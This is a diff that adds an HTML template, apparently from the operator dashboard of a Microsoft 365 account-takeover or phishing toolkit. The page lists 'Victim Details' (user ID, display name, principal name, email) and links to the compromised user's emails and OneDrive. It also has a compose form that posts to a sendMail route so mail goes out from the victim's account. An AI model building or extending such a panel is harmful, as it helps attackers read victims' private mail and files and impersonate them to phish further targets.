@@ -1,0 +1,75 @@
+{{define "title"}}Microsoft Services{{end}}
+{{define "head"}}
+<style>
+        .email-compose-card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 700px; /* Max width for the compose window */
+            padding: 30px;
+            box-sizing: border-box;
+        }
+        .btn-send {
+            background-color: #1a73e8; /* Gmail blue */
+            border-color: #1a73e8;
+            color: #ffffff;
+            font-weight: 600;
+            padding: 10px 25px;
+            border-radius: 8px;
+            transition: background-color 0.2s ease-in-out, border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        .btn-send:hover {
+            background-color: #1565c0; /* Darker blue on hover */
+            border-color: #1565c0;
+            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
+        }
+        textarea.form-control {
+            min-height: 200px; /* Larger text area for message */
+            resize: vertical; /* Allow vertical resizing */
+        }
+        .header-title {
+            font-size: 1.75rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+    </style>
+{{end}}
+{{define "content"}}
+<div class="container">
+    <div class="card mb-4">
+    <div class="card-body">
+        <h5 class="card-title">Victim Details</h5>
+        <p class="card-text"><strong>User ID:</strong> {{.Data.userInfo.ID}}</p>
+        <p class="card-text"><strong>Display Name:</strong> {{.Data.userInfo.DisplayName}}</p>
+        <p class="card-text"><strong>User Principal Name:</strong> {{.Data.userInfo.UserPrincipalName}}</p>
+        <p class="card-text"><strong>Email:</strong> {{.Data.userInfo.Mail}}</p>
+        <a href="/emails/{{.Data.ID}}" class="btn btn-secondary">View Emails</a>
+        <a href="/onedrive/{{.Data.ID}}" class="btn btn-primary">View OneDrive</a>
+</div>  
+</div>              
+                        
+<div class="email-compose-card">
+        <h2 class="header-title">Compose an Email</h2>
+        <form id="emailForm" action="/sendMail/{{.Data.ID}}" method="POST">
+            <div class="mb-3">
+                <label for="recipientEmail" class="form-label">To</label>
+                <input type="email" class="form-control" name="recipient" id="recipient" placeholder="Recipient's Email" required>
+            </div>
+            <div class="mb-3">
+                <label for="subject" class="form-label">Subject</label>
+                <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" required>
+            </div>
+            <div class="mb-4">
+                <label for="body" class="form-label">Message</label>
+                <textarea class="form-control" name="body" id="body" placeholder="Write your message here..." required></textarea>
+            </div>
+            <div class="d-grid">
+                <button type="submit" class="btn btn-send">Send</button>
+            </div>
+        </form>
+</div>
+<div class="mb-4"></div>
+{{end}}
